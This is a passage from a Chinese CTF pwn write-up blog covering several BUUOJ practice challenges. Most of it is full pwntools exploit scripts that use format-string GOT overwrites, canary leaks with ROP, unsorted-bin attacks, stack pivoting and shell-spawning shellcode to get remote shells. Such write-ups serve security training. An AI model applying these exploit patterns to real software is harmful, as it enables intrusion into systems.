class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,str(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,text</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br> sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,str(text))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br><span class="hljs-comment">#---------------------------------------------------------------</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;by pass check&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>heap=uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-symbol">:-</span><span class="hljs-number">1</span>])<br>print hex(heap)<br><span class="hljs-comment">#--------------------------------------------------------------</span><br>head=heap-<span class="hljs-number">0x250</span><br>allocate(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,p64(head))<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">0x23</span>+<span class="hljs-string">&#x27;\xff&#x27;</span>)<br><span class="hljs-comment">#delete(0)</span><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#-------------------------------------------------------------</span><br><span class="hljs-comment">#allocate(0x80)</span><br><span class="hljs-comment">#delete(1)</span><br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-fmt32">axb_2019_fmt32</h3><p><strong>关键词</strong>：格式化字符串漏洞</p><p><strong>思路</strong>：</p><p>这题自带循环，没有栈溢出的地方，而且got表可写</p><p>进行两次格式化字符串漏洞利用，和一次填写</p><p>1.第一次造成任意读，泄露puts的got表，进而泄露libc</p><p>2.第二次造成任意写，把strlen的got表改为system</p><p>3.第三次写入;/bin/sh,就能开shell</p><p><strong>注意点</strong>：</p><p>1.这题alarm为3秒，为方便分析，先使其失效</p><p><a href="https://blog.csdn.net/A951860555/article/details/111214951">ctf - pwn题之alarm函数_lifanxin的博客-CSDN博客</a>有三种方法</p><p>我用其中一种，用vim打开文件</p><p>打开后直接输入/alarm进行搜索</p><p>找到后回车，按下i进行编辑，更改为isnan</p><p>2.多次运行程序调试测定偏移（包括第二次）</p><p>3.第二次格式化字符串利用中，不能一次写进4字地址，分两次，strlen地址的前后顺序由大小决定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27679</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf=ELF(<span class="hljs-string">&#x27;./axb_2019_fmt32&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+<span class="hljs-string">&#x27;%8$s&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>r.recv(<span class="hljs-number">5</span>)<br>got=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>sys=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#--------------------------------</span><br>strlen=elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>high_sys=(sys&gt;&gt;<span class="hljs-number">16</span>)<br>low_sys=sys&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(high_sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(low_sys)<br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br><span class="hljs-comment">#payload=&#x27;p&#x27;+&#x27;%&#x27;+str(low_sys-10)+&#x27;c%15$hn&#x27;+&#x27;%&#x27;+str(high_sys-low_sys)+&#x27;c%16$hn&#x27;+&#x27;pp&#x27;</span><br><span class="hljs-comment">#print len(payload)</span><br><span class="hljs-comment">#r.sendline(payload+p32(strlen)+p32(strlen+2))</span><br>pad=<span class="hljs-string">&#x27;a&#x27;</span>+fmtstr_payload(<span class="hljs-number">8</span>,&#123;elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]:sys&#125;,write_size = <span class="hljs-string">&quot;byte&quot;</span>,numbwritten = <span class="hljs-number">0xa</span>)<br>r.sendline(pad)<br><span class="hljs-comment">#-------------------------------</span><br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;;/bin/sh&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>小结：忘光光，做的时候花了很久，%nc输入n个数，计算字符数到$（不包括）,第二次利用格式出字符串的‘a’是为了对齐？</p><p>pwntools工具FmtStr利用：</p><p>引用这位师傅文章<a href="https://blog.csdn.net/A951860555/article/details/115061803?spm=1001.2014.3001.5502">pwntools FmtStr格式化字符串类使用详解_lifanxin的博客-CSDN博客</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">64</span>位格式化漏洞要设置一下上下文环境<br>context<span class="hljs-selector-class">.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-function"><span class="hljs-title">fmtstr_payload</span><span class="hljs-params">(offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&quot;byte&quot;</span>)</span></span><br>总共四个参数：<br>offset --&gt; 偏移量 <br>writes --&gt; &#123;被覆盖的地址:要写入的地址&#125; 地址都为int型，也就是不需要使用p32或者p64打包<br>numbwritten --&gt; 已经由printf函数写入的字节数，默认为<span class="hljs-number">0</span><br>write_size --&gt; 逐byte/short/int写入，默认是byte，这样发送的字节少<br>pro = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>printf_got = pro<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;printf&quot;</span>]</span><br>system_plt = pro<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;system&quot;</span>]</span><br>pad = <span class="hljs-built_in">fmtstr_payload</span>(offset, &#123;printf_got:system_plt&#125;)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.send</span>(pad)<br></code></pre></td></tr></table></figure><h3 id="others-babystack">others_babystack</h3><p><strong>关键词</strong>：泄露canary，rop</p><p><strong>思路</strong>：</p><p>1.首先填充数个a至canary，然后接受直到最后一个a，就能接收canary了</p><p>2.然后就能栈溢出，泄露libc</p><p>3.og开shell</p><p><strong>注意点</strong>：</p><p>由于canary的最后两位是0，puts接受到\x00结束，这里我们用\n代替0，就能带出canary，接收的时候收7个，在右填\x00</p><p>小结：</p><p>1.ret是在main结束后，才会执行，所以要选一下3，才能打印出got地址</p><p>2.不是很明白为啥elf.sym[‘main’]不通，而0x400908行？</p><p>3.canary基本形式？0x55dd1e56dddd500</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26665</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;a\n&#x27;</span>)<br>canary=u64(r.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(canary)<br><span class="hljs-comment">#------------------------------------------</span><br>pop_rdi=<span class="hljs-number">0x400a93</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x400908</span>))<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>got=u64(r.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br><span class="hljs-comment">#------------------------------------------</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;p&#x27;</span>*<span class="hljs-number">8</span>+p64(base+o_g_old[<span class="hljs-number">3</span>]))<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easyoverflow">mrctf2020_easyoverflow</h3><p>检查是检查v4是否与他相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27309</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;n0t_r3@11y_f1@g&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-getshell-2">wustctf2020_getshell_2</h3><p>**关键词：**限定字符，用call_system</p><p>只能多填12个，程序中有现成的call函数就可以不用返回值了，因为它会自己把下一条指令给压进去</p><p>所以用call_system能省略返回值</p><p>system(‘sh’)也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29304</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./wustctf2020_getshell_2&#x27;</span>)<br>call_system=<span class="hljs-number">0x08048529</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(call_system)+p32(<span class="hljs-number">0x08048670</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-magicheap">hitcontraining_magicheap</h3><p>题外话：1.突然发现，vim编辑下，按住shift左右移动，会移动到单词首末</p><p>2.才发现，连远端的时候不能gdb.attach调试</p><p><strong>关键词</strong>：unsortbinattack，堆溢出</p><p>参考ctf_wiki<a href="https://ctf-wiki.org/pwn/linux/glibc-heap/unsorted_bin_attack/#unsorted-bin-attack_1">Unsorted Bin Attack - CTF Wiki (ctf-wiki.org)</a></p><p>这题利用到unsortbin attack：当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>所以这里实际是把magic改为了unsortbin的地址&gt;1305</p><p><strong>思路：</strong></p><p>1.申请三个堆，index0，1，2；</p><p>0和2大小随意，1大于0x80</p><p>2.释放index1，1就会放到unsortbin中，利用堆溢出改index0，溢出把index1的bk改为magic-0x10</p><p>unsorted_chunks (av)是链表头的位置</p><p>unsorted_chunks (av)-&gt;bk = bck;   ==&gt;       bck=magic-0x10</p><p>bck-&gt;fd=unsorted_chunks (av)       ==&gt;       magic=unsotbin的地址</p><p>3.在选4869，就可绕过检查，开shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./magicheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28307</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#----------------------------------------------------</span><br>magic=<span class="hljs-number">0x6020A0</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(magic-<span class="hljs-number">0x10</span>))<br>create(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;4869&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-4">ciscn_2019_s_4</h3><p><strong>关键词</strong>：栈迁移，rop，调试</p><p><strong>思路</strong>：</p><p>1.第一个read泄露ebp，得知ebp地址及栈地址</p><p>2.调试的到ebp与填充的偏移</p><p>3.第二个read写rop链，system的参数要为/bin/sh\x00的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29002</span>)<br><span class="hljs-comment">#r=process(&#x27;./ciscn_s_4&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_s_4&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>hack=<span class="hljs-number">0x804854b</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-comment">#gdb.attach(r)</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br><span class="hljs-comment">#------------------------------</span><br>leave_ret=<span class="hljs-number">0x080484b8</span><br>buf=ebp-<span class="hljs-number">0x38</span><br>r.send(<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(<span class="hljs-number">0</span>)+p32(buf+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x24</span>-<span class="hljs-number">0x14</span>)+p32(buf)+p32(leave_ret))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-start">pwnable_start</h3><p>**关键词：**汇编，泄露ebp，调试</p><p><strong>思路：</strong></p><p>1.查看汇编代码得知题目信息，发现read处可0x14后可溢出</p><p>2.依靠其中的write，是根据esp来确定打印addr，选择覆盖ret地址为write那里，便能泄露出栈地地址</p><p>3.gdb调试，查看栈的地址与我们的payload的关系，其实就是esp+4的位置</p><p>4.构造shell代码，溢出跳转至shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29930</span>)<br><span class="hljs-comment">#r=process(&#x27;./start&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x68732f      </span><br><span class="hljs-string">push 0x6e69622f   </span><br><span class="hljs-string">mov ebx, esp</span><br><span class="hljs-string">xor edx, edx</span><br><span class="hljs-string">xor ecx, ecx</span><br><span class="hljs-string">mov al, 0xb       </span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;CTF:&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+p32(<span class="hljs-number">0x08048087</span>))<br>stack_addr=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack_addr)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+p32(stack_addr+<span class="hljs-number">0x14</span>)+sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-closed">wustctf2020_closed</h3><p><strong>int</strong> <strong>close</strong>(<strong>int</strong> fd) 参数说明： fd：是需要关闭的文件描述符</p><p>这道题close（1），close（2）后开shell</p><p>关闭了标准输出，错误输出</p><p>把stdout重定向：exec 1&gt;&amp;0</p><p>将文件描述符 1 重定向到文件描述符 0</p><h3 id="hitcontraining-heapcreator">hitcontraining_heapcreator</h3><p>**关键词：**off-by-one，chunk extend，chunk overlap</p><p>**思路：**这道题有个结构，申请一个堆会在bss段上也有一个0x20大小堆</p><p>里面存了                                           